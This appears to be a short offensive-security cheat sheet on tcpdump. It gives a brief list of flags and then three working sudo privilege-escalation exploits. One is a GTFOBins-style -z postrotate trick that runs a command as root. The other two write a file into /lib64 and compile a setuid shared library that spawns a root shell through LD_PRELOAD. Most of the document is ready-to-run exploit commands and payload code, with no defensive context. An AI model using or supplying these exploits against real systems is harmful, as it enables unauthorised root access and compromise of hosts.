# TCPdump

## tcpdump flags
```
-l   Make stdout line buffered.  Useful if you want to see the data while capturing it.  E.g.,
-n   Don't convert host addresses to names.  This can be used to avoid DNS lookups.
-i   interface
-w   write raw packets to file
-W   will limit the number of files created to the specified number,  
     and  begin  overwriting  files from  the  beginning,  thus creating a 'rotating' buffer. 
-G   rotates the dump file specified with the -w option every rotate_seconds seconds. 
-z   Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file "  where  file  is  the  savefile  being
     closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
-Z   If  tcpdump  is running as root, after opening the capture device or input savefile, 
     but before opening any savefiles for output, change the
     user ID to user and the group ID to the primary group of user 
```

## Classic GTFO Bin 
```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

## Fancy Exploit
> inline
```
timeout 1 sudo tcpdump -i eno49 -w /lib64/libvirt.so -Z $USER port 31337 2>/dev/null; echo 'void __attribute__((constructor)) init() { unlink("/lib64/libvirt.so"); setuid(0); setgid(0); execl("/bin/sh", "/bin/sh", "-i", 0); }' > ~/payload.c; gcc -w -fPIC -shared -o /lib64/libvirt.so ~/payload.c; rm ~/payload.c; chmod 6755 /lib64/libvirt.so; LD_PRELOAD=libvirt.so sudo
```

> expanded 
```
timeout 1 \
sudo tcpdump -i eno49 -w /lib64/libvirt.so -Z $USER port 31337 2>/dev/null; \ 
echo \
    'void __attribute__((constructor)) init() { 
        unlink("/lib64/libvirt.so"); 
        setuid(0); 
        setgid(0); 
        execl("/bin/sh", "/bin/sh", "-i", 0); 
     }' \
> ~/payload.c; \
gcc -w -fPIC -shared -o /lib64/libvirt.so ~/payload.c; \
rm ~/payload.c; \
chmod 6755 /lib64/libvirt.so; \
LD_PRELOAD=libvirt.so sudo    
```

## Fancy Different
```
sudo tcpdump -i eth0 -Z $USER -G1 -W1 -w /lib64/libvirt.so 2> /dev/null; \
echo \
    'void __attribute__((constructor)) init() { 
        unlink("/lib64/libvirt.so"); 
        setuid(0); 
        setgid(0); 
        execl("/bin/sh", "/bin/sh", "-i", 0); 
    }' \
> ~/payload.c; \
gcc -w -fPIC -shared -o /lib64/libvirt.so ~/payload.c; \
rm ~/payload.c; \
chmod 6755 /lib64/libvirt.so; \
LD_PRELOAD=libvirt.so sudo
```
